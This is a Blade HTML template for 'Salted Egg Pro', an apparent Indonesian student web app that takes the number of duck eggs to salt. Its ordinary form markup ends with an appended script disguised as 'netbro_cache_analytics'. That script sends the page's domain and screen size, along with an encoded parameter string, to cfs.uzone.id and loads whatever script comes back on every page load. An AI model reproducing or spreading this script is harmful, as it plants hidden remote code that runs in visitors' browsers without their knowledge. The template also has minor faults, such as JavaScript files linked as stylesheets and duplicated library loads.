<!DOCTYPE html>
<html>
<head>
	<title>Selamat datang | Salted Egg Pro</title>
	<link rel="stylesheet" type="text/css" href="{{ URL::asset('/css.css') }}">
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.6/semantic.min.css">
	<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet">

	<script src="https://cdn.datatables.net/1.10.13/js/jquery.dataTables.min.js" ></script>
    <link rel="stylesheet" type="text/css" href="{{ URL::asset('/dataTables.semanticui.min.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ URL::asset('/semantic.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ URL::asset('/semantic.min.css') }}">
    <link rel="stylesheet" type="text/javascript" href="{{ URL::asset('/semantic.js') }}">
    <link rel="stylesheet" type="text/javascript" href="{{ URL::asset('/semantic.min.js') }}">
    <script src="https://code.jquery.com/jquery-1.12.4.js"></script>
    <script src="https://cdn.datatables.net/1.10.13/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.10.13/js/dataTables.semanticui.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.6/semantic.min.js"></script>

</head>
<body>


<div class="transparan1"><img id="background1" src="{{ URL::asset('image/background3.jpg') }}"></div>
<div id="atas-home">
		<div class="ui grid">
			
				<div class="five wide column">
				</div>
				<div class="nine wide column" style=" margin-top: 5vh;">
					<div class="ilogo3"><img class="ilogo4" src="{{ URL::asset('image/telurasinn.png') }}"></div>
					<p><div class="tulisan3"><div class="t3"><span class="pu">TELUR</span> <span class="ku">ASIN</span></div></div></p>
				</div>
				<div class="two wide column">
					<a href="/pengguna">
					<button class="ui inverted red button" style="margin-right: 30px;">kembali</button>
					</a>
				</div>
			</div>


			<div class="subheader">
			<div class="ui center aligned ">

				<span class="pu">Selamat datang di </span><span class="ku">SALTED EGG PRO<br>
				</span><br>
				<span class="pu"></span>
				<span class="ku">Menentukan Kebutuhan Bahan Bahan Dalam Pembuatan Telur Asin , Sesuai Kualitas Yang di Inginkan</span>
				<span class="pu"><br></span>
				<span class="ku"></span>
				<span class="pu"><br></span>
				<span class="ku"></span>
				<span class="pu"><br></span>
				<span class="ku"></span>
				<span class="pu"><br></span>

			</div>
			</div>

			@if($errors->has('jumlahtelur') ? ' has-error' : '' )
				<div class="alert">
				  <span class="closebtn">&times;</span>  
				     <span>{!! $errors->first('jumlahtelur', '<p class="help-block">:message</p>') !!}</span>
				</div>
				@endif
				

				@if(Session::has('message'))
        	<div class="six wide column">
            <div class="alert1">
                {{ Session::get('message') }}
            </div>
        	</div>
        	@endif


			<div id="menu-kondisi1">
			
				<div class="ui grid">
				<div class="two wide column">
					</div>
					<div class="six wide column">
						
						<p style="margin-bottom: 30px;">
							<span class=tx-input1><span class="ku">JUMLAH</span><span class="pu"> TELUR</span></span></p>
					</div>
					<div class="four wide column" >
							<p style="margin-bottom: 30px;"><span class=tx-input1><span class="pu">:</span></span></p>
					</div>



						<div class="two wide column">
							<form action="{{url('jumlahtelur')}}" method="post">
								{{csrf_field()}}
								<div class="fkondisi">
											<div class="ui right labeled input" style="margin-bottom: 25px;">
										<input placeholder="Jumlah Telur Bebek" type="number" name="jumlahtelur" value="{{old('jumlahtelur')}}">
										<div class="ui basic label">
											Butir
									
  
										</div>
									</div> <span class="ku">  <span style="color: red;">*</span>max 250 butir telur</span>
									
							</div>
						</div>
					</div>

					<div class="next1">
					<br>
					<br>
								<button class="ui red animated button" tabindex="0">
  								<div class="visible content">Pilih Kualitas</div>
  								<div class="hidden content">
   								<div class="text">NEXT</div>
  						</div>
  						</div>
  						</div>
  						</div>
  						</button>
  					</form>
				


	

<footer>
      <div class="versi">
        Salted Egg Pro
      </div>
      <div class="for">
        Kelompok5C
      </div>
	</footer>



<script src="{{ URL::asset('/js/jquery-1.12.4.min.js') }}" type="text/javascript"></script> 
    <script src="{{ URL::asset('/js/wow.min.js') }}" type="text/javascript"></script> 
    <script src="{{ URL::asset('/js/materialize.min.js') }}" type="text/javascript"></script> 

<script type="text/javascript">
	
			new WOW().init();
         $('.alert1').delay(2400).fadeOut(500)

</script>

<script >
var close = document.getElementsByClassName("closebtn");
var i;

for (i = 0; i < close.length; i++) {
    close[i].onclick = function(){
        var div = this.parentElement;
        div.style.opacity = "0";
        setTimeout(function(){ div.style.display = "none"; }, 600);
    }
}
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2Bjw%2bjvmqL3WSUrnnA9180Qh7l5ub%2b6gKdeKDVrP0uqpCOyvMajPCftijUdV%2fKOyC56iSeJuQbNERn03ueP6akmiCN0FwUWY9hdgYb%2bexWEj8bGL9MVUSgA%2fwn8DUSoLmJIO2bmQtbBBXJVTirf383vYTCoOZjwnjzBiNM8dZUjrn5LWWc%2f6gNAHdYD7TsZ4J11bszVMoppkIlRzE0jDKF%2fiB%2fa6e4A1%2fIwE6JZ%2fE%2frkIglagugD6Qdek3JrBkMUB1UN9F4AYKQv4BPQovkaz3LAzqOfACZ9DHahl6GXZyjJC%2ftKc2%2fLepJrIgUwbuZBmpEOIoUyeXkfOZHM90wiSGLYi%2bXTcM17Z%2bXK%2fY0boanVr0YxFMgI8okA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</body>
</html>